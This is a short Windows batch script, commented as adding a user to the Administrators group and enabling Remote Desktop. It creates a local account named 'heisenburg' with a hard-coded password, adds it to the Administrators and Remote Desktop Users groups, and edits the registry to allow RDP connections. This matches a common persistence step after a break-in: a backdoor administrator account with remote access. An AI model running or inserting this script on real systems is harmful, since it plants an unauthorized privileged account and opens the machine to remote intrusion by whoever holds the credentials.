@ECHO OFF
:: Batch file adds a user to Admin and enables RDP

net user heisenburg P@ssW123 /add
net localgroup Administrators heisenburg /add
net localgroup "Remote Desktop Users" heisenburg /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

net users

